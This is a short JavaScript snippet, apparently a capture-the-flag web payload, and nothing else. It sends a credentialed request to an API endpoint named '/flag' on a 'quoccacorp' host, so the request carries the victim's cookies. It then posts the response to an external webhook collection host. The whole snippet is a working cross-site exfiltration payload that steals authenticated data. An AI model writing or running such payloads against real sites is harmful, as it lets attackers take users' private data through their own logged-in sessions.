var x=new XMLHttpRequest();
x.open('GET','https://api.netquocca.quoccacorp.com/flag',false);
x.withCredentials=true;
x.send();
fetch('https://bold-galaxy-05.webhook.cool/',{method:'POST',mode:'no-cors',body:x.responseText});
